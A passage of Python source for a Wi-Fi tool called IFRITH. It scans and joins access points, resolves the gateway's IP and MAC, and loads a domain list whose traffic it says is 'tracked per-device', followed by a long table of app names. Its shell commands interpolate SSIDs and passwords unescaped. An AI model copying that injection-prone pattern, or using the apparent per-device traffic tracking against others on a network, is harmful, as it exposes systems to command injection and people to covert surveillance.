        ssid = None; channel = None; signal = None; enc = "OPEN"
        m = re.search(r'ESSID:"([^"]*)"', block); ssid = m.group(1) if m else None
        m = re.search(r"Channel:(\d+)", block)
        if m: channel = int(m.group(1))
        m = re.search(r"Signal level[=:](-?\d+)", block)
        if m: signal = int(m.group(1))
        if "WPA3" in block: enc = "WPA3"
        elif "WPA2" in block: enc = "WPA2"
        elif "WPA" in block: enc = "WPA"
        elif "WEP" in block: enc = "WEP"
        elif "Encryption key:on" in block: enc = "encrypted"
        aps.append({"bssid": bssid, "ssid": ssid if ssid else "<hidden>",
                    "channel": channel, "signal": signal,
                    "encryption": enc, "pmf": "no"})
    return aps

def _run_nmcli_scan(iface):
    if not sh("which nmcli"): return []
    out = sh(f"nmcli -t -f BSSID,SSID,CHAN,SIGNAL,SECURITY "
             f"dev wifi list ifname {iface} 2>&1", timeout=20)
    aps = []
    for line in out.splitlines():
        parts = line.split(":")
        if len(parts) < 5: continue
        bssid = parts[0].lower()
        if not MAC_RE.match(bssid): continue
        ssid = parts[1] if parts[1] else "<hidden>"
        try: channel = int(parts[2])
        except Exception: channel = None
        try: signal = int(parts[3])
        except Exception: signal = None
        sec = parts[4] or "OPEN"
        aps.append({"bssid": bssid, "ssid": ssid, "channel": channel,
                    "signal": signal, "encryption": sec, "pmf": "no"})
    return aps

def _run_wpa_cli_scan(iface):
    if not sh("which wpa_cli"): return []
    sh(f"wpa_cli -i {iface} scan >/dev/null 2>&1", timeout=10)
    time.sleep(3)
    out = sh(f"wpa_cli -i {iface} scan_results 2>&1", timeout=10)
    aps = []
    for line in out.splitlines():
        parts = re.split(r"\s+", line.strip(), maxsplit=4)
        if len(parts) < 5: continue
        bssid = parts[0].lower()
        if not MAC_RE.match(bssid): continue
        try: freq = int(parts[1])
        except Exception: freq = 0
        try: signal = int(parts[2])
        except Exception: signal = None
        flags = parts[3]; ssid = parts[4] if parts[4] else "<hidden>"
        ch = _channel_from_freq(freq) if freq else None
        if "WPA3" in flags: enc = "WPA3"
        elif "WPA2" in flags: enc = "WPA2"
        elif "WPA" in flags: enc = "WPA"
        elif "WEP" in flags: enc = "WEP"
        else: enc = "OPEN"
        aps.append({"bssid": bssid, "ssid": ssid, "channel": ch,
                    "signal": signal, "encryption": enc, "pmf": "no"})
    return aps

def _list_aps(force_rescan=True):
    iface = CONFIG.get("iface")
    if not iface: return []
    if force_rescan:
        sh(f"iw dev {iface} scan trigger >/dev/null 2>&1", timeout=5)
    collected = []
    for fn, name in ((_run_iw_scan, "iw"), (_run_iwlist_scan, "iwlist"),
                     (_run_nmcli_scan, "nmcli"), (_run_wpa_cli_scan, "wpa_cli")):
        try: aps = fn(iface)
        except Exception as e:
            aps = []
            if CONFIG.get("debug"):
                console.print(f"[red]IFRITH {name} failed: {e}[/]")
        if aps:
            collected.extend(aps)
            if len(aps) >= 3: break
    seen = {}
    for a in collected:
        b = a["bssid"]
        if b not in seen: seen[b] = a
        else:
            cur = seen[b]
            if (a["signal"] or -999) > (cur["signal"] or -999):
                if not a.get("channel") and cur.get("channel"):
                    a["channel"] = cur["channel"]
                seen[b] = a
    unique = list(seen.values())
    unique.sort(key=lambda x: -(x["signal"] or -999))
    return unique

def _current_ssid():
    iface = CONFIG.get("iface")
    if not iface: return None, None
    iw = sh(f"iw dev {iface} link")
    if not iw or "Not connected" in iw: return None, None
    m = re.search(r"SSID:\s*(.+)", iw); ssid = m.group(1).strip() if m else None
    m = re.search(r"Connected to\s+([0-9a-f:]{17})", iw, re.I)
    bssid = m.group(1).lower() if m else None
    return ssid, bssid

def _wait_for_connection(expected_bssid=None, expected_ssid=None, timeout=None):
    if timeout is None: timeout = CONFIG["connect_timeout_s"]
    iface = CONFIG.get("iface")
    poll = CONFIG["connect_poll_interval_s"]
    start = time.time()
    while time.time() - start < timeout:
        iw = sh(f"iw dev {iface} link")
        if iw and "Not connected" not in iw:
            ssid, bssid = _current_ssid()
            if expected_bssid and bssid and bssid.lower() == expected_bssid.lower():
                return True, ssid, bssid
            if expected_ssid and ssid == expected_ssid and not expected_bssid:
                return True, ssid, bssid
            if not expected_bssid and not expected_ssid and ssid:
                return True, ssid, bssid
        time.sleep(poll)
    return False, None, None

def _try_connect(ap, password=None):
    iface = CONFIG.get("iface"); ssid = ap["ssid"]
    if ssid in (None, "", "<hidden>"): return False
    if sh("which nmcli"):
        if password:
            sh(f"nmcli dev wifi connect '{ssid}' password '{password}' "
               f"ifname {iface}", timeout=20)
        else:
            sh(f"nmcli dev wifi connect '{ssid}' ifname {iface}", timeout=20)
        ok, _, _ = _wait_for_connection(expected_ssid=ssid,
                                         timeout=CONFIG["connect_timeout_s"])
        if ok: return True
    if sh("which wpa_cli"):
        sh(f'wpa_cli -i {iface} remove_network all', timeout=5)
        nid = sh(f'wpa_cli -i {iface} add_network', timeout=5)
        if nid and nid.isdigit():
            sh(f'wpa_cli -i {iface} set_network {nid} ssid \'"{ssid}"\'', timeout=5)
            if password:
                sh(f'wpa_cli -i {iface} set_network {nid} psk \'"{password}"\'', timeout=5)
            else:
                sh(f'wpa_cli -i {iface} set_network {nid} key_mgmt NONE', timeout=5)
            sh(f'wpa_cli -i {iface} enable_network {nid}', timeout=5)
            sh(f'wpa_cli -i {iface} select_network {nid}', timeout=5)
            sh(f'wpa_cli -i {iface} save_config', timeout=5)
            ok, _, _ = _wait_for_connection(expected_ssid=ssid,
                                             timeout=CONFIG["connect_timeout_s"])
            if ok: return True
    return False

def _diagnose_scan_failure():
    iface = CONFIG.get("iface")
    if not iface: return "no interface"
    state = sh(f"cat /sys/class/net/{iface}/operstate 2>/dev/null")
    if state not in ("up", "unknown"): return f"{iface} DOWN"
    t = sh(f"iw dev {iface} info 2>/dev/null | grep -oP '(?<=type\\s)\\S+'")
    if t and t != "managed": return f"{iface} {t} mode"
    if not sh("which iw iwlist nmcli wpa_cli 2>/dev/null"): return "no scanner"
    probe = sh(f"iw dev {iface} scan 2>&1 | head -3")
    if "Operation not permitted" in probe: return "kernel denies scan"
    return "unknown"

def _render_ap_table(aps, title="IFRITH — Nearby APs"):
    t = Table(title=title, expand=True)
    t.add_column("#", width=3, justify="right")
    t.add_column("SSID", overflow="ellipsis")
    t.add_column("BSSID", no_wrap=True)
    t.add_column("Ch", width=4, justify="right")
    t.add_column("Sig", width=6, justify="right")
    t.add_column("Enc", width=14)
    t.add_column("PMF", width=5)
    for i, a in enumerate(aps, 1):
        ch = a["channel"]; ch_str = str(ch) if ch is not None else "?"
        t.add_row(str(i), a["ssid"], a["bssid"], ch_str,
                  f"{a['signal']:.0f}" if a["signal"] is not None else "?",
                  a["encryption"], a.get("pmf", "no"))
    console.print(t)

def _do_scan_and_choose():
    while True:
        iface = CONFIG.get("iface")
        _SPLASH.set_status("SCANNING SPECTRUM")
        console.print(f"[cyan]IFRITH scanning nearby APs on {iface}…[/]")
        with console.status("[cyan]Scanning…[/]"):
            sh(f"iw dev {iface} scan trigger >/dev/null 2>&1", timeout=5)
            time.sleep(1.5)
            aps = _list_aps()
        cur_ssid, cur_bssid = _current_ssid()
        if not aps:
            console.print(Panel(f"[red]No APs found on {iface}.[/]\n\n"
                f"[bold]Reason:[/] {_diagnose_scan_failure()}",
                border_style="red", title="IFRITH — Wi-Fi"))
            if cur_ssid:
                ans = Prompt.ask("[bold]Enter=keep, r=rescan, q=quit[/]",
                                 default="").strip().lower()
                if ans in ("q", "quit"): _full_clean_exit(0)
                if ans in ("r", "rescan", "s"): continue
                return True
            else:
                ans = Prompt.ask("[bold]r=rescan, c=continue, q=quit[/]",
                                 default="").strip().lower()
                if ans in ("q", "quit"): _full_clean_exit(0)
                if ans in ("r", "rescan", "s"): continue
                if ans in ("c", "continue", ""): return True
                continue
        _render_ap_table(aps)
        if cur_ssid:
            console.print(f"[green]Connected to[/] [bold cyan]{cur_ssid}[/] "
                          f"[dim]({cur_bssid or '?'})[/]")
        ans = Prompt.ask("[bold]Enter AP number, Enter=keep, r=rescan, q=quit[/]",
                         default="").strip().lower()
        if ans in ("q", "quit"): _full_clean_exit(0)
        if ans in ("r", "rescan", "s"): continue
        if ans == "":
            if cur_ssid: return True
            continue
        if not ans.isdigit(): continue
        n = int(ans)
        if not (1 <= n <= len(aps)): continue
        chosen = aps[n - 1]
        password = None
        if chosen["encryption"] != "OPEN":
            password = Prompt.ask(f"[yellow]Password for [bold]{chosen['ssid']}[/][/]",
                                  default="", password=True)
            if not password: continue
        with console.status("[cyan]Connecting…[/]"):
            _SPLASH.set_status("NEGOTIATING UPLINK")
            ok = _try_connect(chosen, password)
        if ok: return True

def _startup_network_choice():
    iface = CONFIG.get("iface")
    if not iface: return False
    cur_ssid, cur_bssid = _current_ssid()
    if cur_ssid:
        want_change = Confirm.ask(
            f"[bold]Grant IFRITH permission to scan nearby access points "
            f"on {iface}? To change your WiFi? [y/n][/]", default=False)
        if not want_change:
            console.print(Panel(f"[green]Already connected to[/] "
                f"[bold cyan]{cur_ssid}[/] [dim]({cur_bssid or '?'})[/]",
                border_style="green", title="IFRITH — Wi-Fi"))
            return True
        return _do_scan_and_choose()
    console.print(Panel("[yellow]Not connected to any Wi-Fi.[/]",
                        border_style="yellow", title="IFRITH — Wi-Fi"))
    return _do_scan_and_choose()

def _detect_gateway_ip_only():
    iface = CONFIG.get("iface"); my_ip = CONFIG.get("my_ip") or ""
    my_net = None
    if my_ip:
        try: my_net = ipaddress.IPv4Network(f"{my_ip}/24", strict=False)
        except Exception: my_net = None
    def _accept(cand):
        if not cand: return False
        if not re.match(r"^\d+\.\d+\.\d+\.\d+$", cand): return False
        if my_net is not None:
            try:
                if not (ipaddress.IPv4Address(cand) in my_net): return False
            except Exception: return False
        return True
    if iface:
        for line in sh(f"ip route show default dev {iface}").splitlines():
            m = re.search(r"default(?:\s+via\s+(\S+))?", line)
            if m and _accept(m.group(1)):
                return m.group(1), f"ip route dev {iface}"
    for line in sh("ip route show table all").splitlines():
        m = re.search(r"^default\s+via\s+(\S+)(?:\s+dev\s+(\S+))?", line)
        if m:
            via = m.group(1); dev = m.group(2)
            if iface and dev and dev != iface: continue
            if _accept(via): return via, f"ip route table (dev {dev or '?'})"
    if my_net is not None:
        base = ".".join(my_ip.split(".")[:3])
        for guess in (f"{base}.1", f"{base}.254"):
            r = sh(f"ping -c 1 -W 1 {guess} >/dev/null 2>&1 && echo ok")
            if "ok" in r: return guess, f"heuristic {guess}"
        return f"{base}.1", "heuristic .1"
    return None, "not found"

def _resolve_gateway_mac(gw_ip):
    if not gw_ip: return None
    mac = sh(f"ip neigh show {gw_ip} | awk '{{print $5}}'")
    if mac and mac != "FAILED" and MAC_RE.match(mac): return mac
    sh(f"ping -c 2 -W 1 {gw_ip} >/dev/null 2>&1")
    mac = sh(f"ip neigh show {gw_ip} | awk '{{print $5}}'")
    if mac and mac != "FAILED" and MAC_RE.match(mac): return mac
    return None

def _gateway_selection_flow():
    if CONFIG.get("gateway_ip"):
        gw = CONFIG["gateway_ip"]; mac = _resolve_gateway_mac(gw)
        console.print(Panel(f"Using gateway from CLI: [bold cyan]{gw}[/]\n"
            f"MAC: {mac or '[yellow](unknown)[/]'}",
            border_style="green", title="IFRITH — Gateway"))
        CONFIG["gateway_mac"] = mac
        return True
    while True:
        _SPLASH.set_status("RESOLVING GATEWAY")
        auto_ip, source = _detect_gateway_ip_only()
        auto_mac = _resolve_gateway_mac(auto_ip) if auto_ip else None
        t = Table(title="IFRITH — Gateway selection", expand=True)
        t.add_column("#", width=3); t.add_column("Mode")
        t.add_column("Gateway IP"); t.add_column("MAC")
        t.add_column("Source")
        if auto_ip:
            t.add_row("1", "[green]Auto[/]", f"[bold cyan]{auto_ip}[/]",
                      auto_mac or "[yellow]?[/]", f"[dim]{source}[/]")
        else:
            t.add_row("1", "[dim]Auto[/]", "[red]not found[/]", "—", "—")
        t.add_row("2", "[cyan]Manual[/]", "you type the IP", "—", "—")
        console.print(t)
        ans = Prompt.ask("[bold]1=auto, 2=manual, q=quit[/]",
                         default="").strip().lower()
        if ans in ("q", "quit"): _full_clean_exit(0)
        if ans in ("1", "auto", ""):
            if not auto_ip: continue
            CONFIG["gateway_ip"] = auto_ip
            CONFIG["gateway_mac"] = auto_mac
            return True
        if ans == "2":
            user_ip = Prompt.ask("[bold]Gateway IP[/]").strip()
            if not re.match(r"^\d+\.\d+\.\d+\.\d+$", user_ip): continue
            CONFIG["gateway_ip"] = user_ip
            CONFIG["gateway_mac"] = _resolve_gateway_mac(user_ip)
            return True

def _post_gateway_dnsbl_loading():
    _SPLASH.set_status("ARMING DNSBL MATRIX")
    _load_dnsbl()
    if _DNSBL:
        console.print(Panel(
            f"[green]DNSBL whitelist loaded:[/] [bold]{len(_DNSBL)}[/] "
            f"sensitive domains\n"
            f"[dim]Traffic to any of these will be detected and tracked "
            f"per-device.[/]",
            border_style="magenta", title="IFRITH — DNSBL"))

def get_wifi_info(iface):
    info = {"iface": iface}
    if not iface: return info
    ip_out = sh(f"ip -4 addr show {iface} | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){{3}}'")
    if ip_out: info["my_ip"] = ip_out.split()[0]
    mac_out = sh(f"cat /sys/class/net/{iface}/address 2>/dev/null")
    if mac_out and MAC_RE.match(mac_out.strip()):
        info["my_mac"] = mac_out.strip().lower()
    try:
        ssid, bssid = _current_ssid()
        if ssid: info["ssid"] = ssid
        if bssid: info["bssid"] = bssid
    except Exception: pass
    try:
        iw_out = sh(f"iw dev {iface} link")
        m = re.search(r"freq:\\s*(\\d+)", iw_out)
        if m: info["channel"] = _channel_from_freq(m.group(1))
        m = re.search(r"signal:\\s*(-?\\d+)", iw_out)
        if m: info["signal"] = int(m.group(1))
        m = re.search(r"SSID:\\s*(.+)", iw_out)
        if m and not info.get("ssid"): info["ssid"] = m.group(1).strip()
    except Exception: pass
    info["monitor_mode"] = False
    try:
        iw_info = sh(f"iw dev {iface} info")
        if "type monitor" in iw_info: info["monitor_mode"] = True
    except Exception: pass
    return info

def _resolve_testdata_dir():
    for cand in (os.path.join(SCRIPT_DIR, "testdata"),
                 os.path.join(os.getcwd(), "testdata")):
        if cand and os.path.isdir(cand): return cand
    return None

APP_INSTAGRAM="Instagram";APP_FACEBOOK="Facebook";APP_WHATSAPP="WhatsApp"
APP_MESSENGER="Messenger";APP_THREADS="Threads";APP_TIKTOK="TikTok"
APP_SNAPCHAT="Snapchat";APP_TWITTER="X (Twitter)";APP_REDDIT="Reddit"
APP_DISCORD="Discord";APP_TELEGRAM="Telegram";APP_SIGNAL="Signal"
APP_WECHAT="WeChat";APP_LINE="LINE";APP_KAKAO="KakaoTalk";APP_VIBER="Viber"
APP_IMO="IMO";APP_TEAMS="Microsoft Teams";APP_SLACK="Slack";APP_ZOOM="Zoom"
APP_MEET="Google Meet";APP_SKYPE="Skype";APP_LINKEDIN="LinkedIn"
APP_PINTEREST="Pinterest";APP_TUMBLR="Tumblr";APP_MASTODON="Mastodon"
APP_BLUESKY="Bluesky";APP_VK="VK";APP_OKRU="OK.ru";APP_WEIBO="Weibo"
APP_DOUYIN="Douyin";APP_KUAISHOU="Kuaishou";APP_XIAOHONGSHU="Xiaohongshu"
APP_ZHIHU="Zhihu";APP_QQ="QQ";APP_QUORA="Quora"
APP_YOUTUBE="YouTube";APP_NETFLIX="Netflix";APP_TWITCH="Twitch"
APP_PRIMEVIDEO="Prime Video";APP_DISNEYPLUS="Disney+";APP_HULU="Hulu"
APP_HBOMAX="HBO Max";APP_PEACOCK="Peacock";APP_PARAMOUNT="Paramount+"
APP_CRUNCHYROLL="Crunchyroll";APP_VIMEO="Vimeo";APP_DAILYMOTION="Dailymotion"
APP_HOTSTAR="Hotstar";APP_JIOCINEMA="JioCinema";APP_SONYLIV="SonyLIV"
APP_ZEE5="ZEE5";APP_BILIBILI="Bilibili";APP_IQIYI="iQIYI";APP_RUMBLE="Rumble"
APP_ODYSEE="Odysee";APP_SPOTIFY="Spotify";APP_APPLEMUSIC="Apple Music"
APP_SOUNDCLOUD="SoundCloud";APP_DEEZER="Deezer";APP_TIDAL="Tidal"
APP_PANDORA="Pandora";APP_IHEART="iHeartRadio";APP_AUDIBLE="Audible"
APP_GOOGLE="Google";APP_GMAIL="Gmail";APP_DRIVE="Google Drive"
APP_DOCS="Google Docs";APP_PHOTOS="Google Photos";APP_MAPS="Google Maps"
APP_GPLAY="Google Play";APP_GOOGLEADS="Google Ads"
APP_GOOGLEANALYTICS="Google Analytics";APP_FIREBASE="Firebase"
APP_CLOUD="Google Cloud";APP_MICROSOFT="Microsoft";APP_OUTLOOK="Outlook"
APP_OFFICE365="Office 365";APP_ONEDRIVE="OneDrive";APP_SHAREPOINT="SharePoint"
APP_WINUPDATE="Windows Update";APP_AZURE="Azure";APP_VSCODE="VS Code"
APP_APPLE="Apple";APP_APPSTORE="App Store";APP_ICLOUD="iCloud"
APP_ITUNES="iTunes";APP_AMAZON="Amazon";APP_AWS="AWS"
APP_CLOUDFRONT="AWS CloudFront";APP_CLOUDFLARE="Cloudflare";APP_AKAMAI="Akamai"
APP_FASTLY="Fastly";APP_CLOUDFLAREDNS="Cloudflare DNS";APP_GITHUB="GitHub"
APP_GITLAB="GitLab";APP_BITBUCKET="Bitbucket";APP_STACKOVERFLOW="Stack Overflow"
APP_NPM="npm";APP_PYPI="PyPI";APP_DOCKER="Docker";APP_VERCEL="Vercel"
APP_NETLIFY="Netlify";APP_HEROKU="Heroku";APP_OPENAI="OpenAI"
APP_ANTHROPIC="Anthropic";APP_CLAUDE="Claude";APP_GEMINI="Gemini"
APP_HUGGINGFACE="HuggingFace";APP_PERPLEXITY="Perplexity";APP_PAYPAL="PayPal"
APP_STRIPE="Stripe";APP_VENMO="Venmo";APP_CASHAPP="Cash App";APP_WISE="Wise"
APP_REVOLUT="Revolut";APP_BINANCE="Binance";APP_COINBASE="Coinbase"
APP_KRAKEN="Kraken";APP_METAMASK="MetaMask";APP_OPENSEA="OpenSea"
APP_STEAM="Steam";APP_EPICGAMES="Epic Games";APP_RIOT="Riot Games"
APP_ROBLOX="Roblox";APP_MINECRAFT="Minecraft";APP_PLAYSTATION="PlayStation"
APP_XBOX="Xbox";APP_NINTENDO="Nintendo";APP_BATTLENET="Battle.net"
APP_PUBG="PUBG Mobile";APP_GARENA="Garena";APP_SUPERCELL="Supercell"
APP_UBER="Uber";APP_AIRBNB="Airbnb";APP_BOOKING="Booking.com"
APP_EXPEDIA="Expedia";APP_TRIPADVISOR="TripAdvisor";APP_SPEEDTEST="Speedtest"
APP_TEMU="Temu";APP_SHEIN="Shein";APP_ALIEXPRESS="AliExpress"
APP_TAOBAO="Taobao";APP_JD="JD.com";APP_FLIPKART="Flipkart"
APP_ETSY="Etsy";APP_EBAY="eBay";APP_WALMART="Walmart"
APP_SHOPIFY="Shopify";APP_MERCADO="MercadoLibre";APP_RAKUTEN="Rakuten"
APP_NEWEGG="Newegg";APP_WISH="Wish";APP_TARGET="Target"
APP_BESTBUY="Best Buy";APP_HOME_DEPOT="Home Depot";APP_IKEA="IKEA"
APP_ZOZOTOWN="ZOZOTOWN";APP_SHOPEE="Shopee";APP_LAZADA="Lazada"
APP_DARAZ="Daraz";APP_NOON="Noon";APP_JUMIA="Jumia"
APP_KICK="Kick";APP_TROVO="Trovo";APP_NICOVIDEO="Niconico"
APP_ACFUN="Acfun";APP_DOUYU="Douyu";APP_HUYA="Huya"
APP_BIGO="Bigo Live";APP_SHOWROOM="Showroom";APP_17LIVE="17LIVE"
APP_POCCO="Pococha";APP_IRIAM="IRIAM";APP_REALITY="REALITY"
APP_MILDOM="Mildom";APP_OPENREC="OPENREC";APP_TWITCAST="TwitCasting"
APP_MIXCH="Mixch";APP_FRFR="FRFR"
APP_NAVER="Naver";APP_DAUM="Daum";APP_WHALE="Naver Whale"
APP_WEBTOON="Webtoon";APP_TAPAS="Tapas";APP_WATTPAD="Wattpad"
APP_ROYALROAD="Royal Road";APP_SCRIBBLEHUB="ScribbleHub"
APP_AO3="Archive of Our Own";APP_FANFICTION="FanFiction"
APP_QQMUSIC="QQ Music";APP_NETEASE_MUSIC="NetEase Music";APP_KUGOU="Kugou"
APP_KUWO="Kuwo";APP_MIGU="Migu";APP_JOX_MUSIC="JOOX"
APP_MELON="Melon";APP_GENIE_MUSIC="Genie Music";APP_BUGS="Bugs"
APP_FLO="FLO";APP_VIBE="VIBE";APP_GAANA="Gaana"
APP_JIOSAAVN="JioSaavn";APP_WYNK="Wynk";APP_RESSO="Resso"
APP_BOOM_PLAY="Boomplay";APP_AUDIOMACK="Audiomack"
APP_NAPSTER="Napster";APP_8TRACKS="8tracks";APP_MIXCLOUD="Mixcloud"
APP_BANDCAMP="Bandcamp";APP_JUNO="Juno Download"
APP_BEATPORT="Beatport";APP_TRAXSOURCE="Traxsource"
APP_DINGTALK="DingTalk";APP_FEISHU="Feishu";APP_WECHAT_WORK="WeChat Work"
APP_QQ_MAIL="QQ Mail";APP_163_MAIL="163 Mail";APP_126_MAIL="126 Mail"
APP_YANDEX_MAIL="Yandex Mail";APP_MAIL_RU="Mail.ru"
APP_PROTONMAIL="ProtonMail";APP_TUTANOTA="Tutanota"
APP_FASTMAIL="Fastmail";APP_ZOHO_MAIL="Zoho Mail";APP_GMX="GMX"
APP_AOL_MAIL="AOL Mail";APP_ICLOUD_MAIL="iCloud Mail"
APP_DROPBOX="Dropbox";APP_BOX="Box";APP_MEGA="MEGA"
APP_PCLOUD="pCloud";APP_SYNC_COM="Sync.com";APP_ICEDRIVE="Icedrive"
APP_MEDIAFIRE="MediaFire";APP_WETRANSFER="WeTransfer"
APP_NOTION="Notion";APP_OBSIDIAN="Obsidian Sync";APP_EVERNOTE="Evernote"
APP_ONENOTE="OneNote";APP_BEAR="Bear";APP_CRAFT="Craft"
APP_AIRTABLE="Airtable";APP_TRELLO="Trello";APP_ASANA="Asana"
APP_MONDAY="Monday.com";APP_CLICKUP="ClickUp";APP_JIRA="Jira"
APP_CONFLUENCE="Confluence";APP_LINEAR="Linear"
APP_BASE_CAMP="Basecamp";APP_MIRO="Miro";APP_FIGMA="Figma"
APP_CANVA="Canva";APP_ADOBE_CC="Adobe Creative Cloud"
APP_AUTOCAD="AutoCAD";APP_SKETCHUP="SketchUp"
APP_SOLIDWORKS="SolidWorks";APP_BLENDER="Blender Cloud"
APP_UNITY="Unity";APP_UNREAL="Unreal Engine"
APP_ROBLOX_STUDIO="Roblox Studio";APP_MINECRAFT_REALMS="Minecraft Realms"
APP_EA_ORIGIN="EA Origin";APP_UBISOFT="Ubisoft Connect"
APP_GOG="GOG Galaxy";APP_BATTLENET_LAUNCHER="Battle.net"
APP_ITCHIO="itch.io";APP_HUMBLE="Humble Bundle"
APP_GEFORCE_NOW="GeForce NOW";APP_XCLOUD="Xbox Cloud Gaming"
APP_SHADOW_PC="Shadow PC"
APP_PARALLELS="Parallels";APP_VMWARE="VMware"
APP_VIRTUALBOX="VirtualBox";APP_DOCKER_HUB="Docker Hub"
APP_KUBERNETES="Kubernetes";APP_TERRAFORM="Terraform"
APP_ANSIBLE="Ansible";APP_JENKINS="Jenkins"
APP_CIRCLE_CI="CircleCI";APP_TRAVIS="Travis CI"
APP_GITHUB_ACTIONS="GitHub Actions";APP_GITLAB_CI="GitLab CI"
APP_CODING="CodinGame";APP_CODECADEMY="Codecademy"
APP_COURSERA="Coursera";APP_UDEMY="Udemy";APP_EDX="edX"
APP_KHAN_ACADEMY="Khan Academy";APP_DUOLINGO="Duolingo"
APP_BABEL="Babbel";APP_ROSETTA_STONE="Rosetta Stone"
APP_MEMRISE="Memrise";APP_BUSUU="Busuu"
APP_LINGODA="Lingoda";APP_ITALKI="italki"
APP_MEETUP="Meetup";APP_EVENTBRITE="Eventbrite"
APP_TICKETMASTER="Ticketmaster";APP_STUBHUB="StubHub"
APP_SEATGEEK="SeatGeek";APP_DICE="Dice"
APP_BANDSINTOWN="Bandsintown";APP_SONGKICK="Songkick"
APP_RESIDENT_ADVISOR="Resident Advisor"
APP_AGODA="Agoda";APP_HOTELS="Hotels.com";APP_TRIVAGO="trivago"
APP_KAYAK="Kayak";APP_SKYSCANNER="Skyscanner"
APP_MOMONDO="momondo";APP_HOPPER="Hopper"
APP_ROME2RIO="Rome2Rio";APP_OMIO="Omio";APP_TRAINLINE="Trainline"
APP_HELLOTALK="HelloTalk";APP_TANDEM="Tandem";APP_SPEAKY="Speaky"
APP_INTERPALS="InterPals"
APP_TINDER="Tinder";APP_BUMBLE="Bumble"
APP_HINGE="Hinge";APP_OKCUPID="OkCupid"
APP_MATCH="Match";APP_PLENTY_OF_FISH="Plenty of Fish"
APP_GRINDR="Grindr";APP_HER="HER";APP_SCRUFF="Scruff"
APP_COFFEE_MEETS_BAGEL="Coffee Meets Bagel"
APP_LOVOO="LOVOO";APP_JAUMO="Jaumo"
APP_BADOO="Badoo";APP_MEETME="MeetMe"
APP_YUBO="Yubo";APP_HOUSE_PARTY="Houseparty"
APP_MONKEY="Monkey";APP_OMEGLE="Omegle"
APP_CHATROULETTE="Chatroulette";APP_FLINGSTER="Flingster"
APP_SHOPEE_FOOD="ShopeeFood";APP_GRAB="Grab"
APP_GOJEK="Gojek";APP_DIDI="DiDi"
APP_BOLT="Bolt";APP_CAREM="Careem"
APP_LYFT="Lyft";APP_INDRIVE="inDrive"
APP_OLA="OLA";APP_RAPIDO="Rapido"
APP_PATHao="Pathao";APP_OBHAI="OBHAI"
APP_SHOHOZ="Shohoz";APP_CHALO="Chalo"
APP_SWIGGY="Swiggy";APP_ZOMATO="Zomato"
APP_DOORDASH="DoorDash";APP_GRUBHUB="Grubhub"
APP_UBER_EATS="Uber Eats";APP_DELIVEROO="Deliveroo"
APP_JUST_EAT="Just Eat";APP_TAKEAWAY="Takeaway"
APP_DELIVERY_HERO="Delivery Hero";APP_FOODPANDA="foodpanda"
APP_ELEME="Ele.me";APP_MEITUAN="Meituan"
APP_BAEMIN="Baemin";APP_YOGIYO="Yogiyo"
APP_DEMAE="Demae-can";APP_RAKUTEN_DELIVERY="Rakuten Delivery"
APP_IFOOD="iFood";APP_RAPPI="Rappi"
APP_PEDIDOSYA="PedidosYa";APP_GLOVO="Glovo"
APP_WOLT="Wolt";APP_BOLT_FOOD="Bolt Food"
APP_BLINKIT="Blinkit";APP_ZEPTO="Zepto"
APP_INSTACART="Instacart";APP_GO_PUFF="GoPuff"
APP_GETIR="Getir";APP_GORILLAS="Gorillas"
APP_FLINK="Flink";APP_CAINIAO="Cainiao"
APP_FEDEX="FedEx";APP_UPS="UPS";APP_DHL="DHL"
APP_USPS="USPS";APP_ROYAL_MAIL="Royal Mail"
APP_POSTE_ITALIANE="Poste Italiane";APP_LA_POSTE="La Poste"
APP_DPD="DPD";APP_GLS="GLS";APP_HERMES="Hermes"
APP_YODEL="Yodel";APP_EVRI="Evri"
APP_TRACK_17="17track";APP_AFTERSHIP="AfterShip";APP_SHIP24="Ship24"
APP_MXTOOLBOX="MXToolbox";APP_DNSCHECKER="DNSChecker"
APP_INTODNS="IntoDNS";APP_VIEWDNS="ViewDNS"
APP_PINGDOM="Pingdom";APP_UPTIMEROBOT="UptimeRobot"
APP_STATUSCAKE="StatusCake";APP_BETTER_STACK="Better Stack"
APP_DATADOG="Datadog";APP_NEW_RELIC="New Relic"
APP_DYNAMICS="Dynamics";APP_SENTRY="Sentry"
APP_BUGSNAG="Bugsnag";APP_ROLLBAR="Rollbar"
APP_LOGGLY="Loggly";APP_PAPERTRAIL="Papertrail"
APP_SPLUNK="Splunk";APP_ELASTIC="Elastic"
APP_GRAFANA="Grafana";APP_PROMETHEUS="Prometheus"
APP_INFLUXDB="InfluxDB";APP_TIMESCALE="Timescale"
APP_CLICKHOUSE="ClickHouse";APP_SNOWFLAKE="Snowflake"
APP_BIGQUERY="BigQuery";APP_REDSHIFT="Redshift"
APP_DATABRICKS="Databricks";APP_TABLEAU="Tableau"
APP_LOOKER="Looker";APP_POWERBI="Power BI"
APP_QLIK="Qlik";APP_SUPERSET="Superset"
APP_METABASE="Metabase";APP_REDASH="Redash"
APP_JASPER="Jasper";APP_COPY_AI="Copy.ai";APP_WRITESONIC="Writesonic"
APP_MIDJOURNEY="Midjourney";APP_DALLE="DALL·E"
APP_STABLE_DIFFUSION="Stable Diffusion"
APP_LEONARDO_AI="Leonardo AI";APP_RUNWAY="Runway"
APP_PIKA="Pika";APP_SORA="Sora"
APP_ELEVENLABS="ElevenLabs";APP_SUNO="Suno"
APP_UDIO="Udio";APP_MURF="Murf"
APP_DESCRIPT="Descript";APP_OTTER="Otter.ai"
APP_FIREFLIES="Fireflies";APP_GRAIN="Grain"
APP_FATHOM="Fathom";APP_TACTIQ="Tactiq"
APP_LOOM="Loom";APP_VIDYARD="Vidyard"
APP_WISTIA="Wistia";APP_BRIGHTCOVE="Brightcove"
APP_KALTURA="Kaltura";APP_PANOPTO="Panopto"
APP_TECHSMITH="TechSmith";APP_CAMTASIA="Camtasia"
APP_SCREENFLOW="ScreenFlow";APP_OBS="OBS Studio"
APP_STREAMLABS="Streamlabs";APP_STREAMELEMENTS="StreamElements"
APP_NIGHTBOT="Nightbot";APP_STREER="Streer";APP_MOOBOT="MooBot"
APP_FOSSABOT="Fossabot";APP_MIXITUP="Mix It Up"
APP_YOUTUBE_STUDIO="YouTube Studio"
APP_YOUTUBE_MUSIC="YouTube Music"
APP_YOUTUBE_KIDS="YouTube Kids"
APP_YOUTUBE_TV="YouTube TV"
APP_YT_STUDIO_MOBILE="YT Studio Mobile"
APP_TWITCH_CHAT="Twitch Chat"
APP_FACEBOOK_LIVE="Facebook Live"
APP_INSTAGRAM_LIVE="Instagram Live"
APP_YOUTUBE_LIVE="YouTube Live"
APP_TIKTOK_LIVE="TikTok Live"

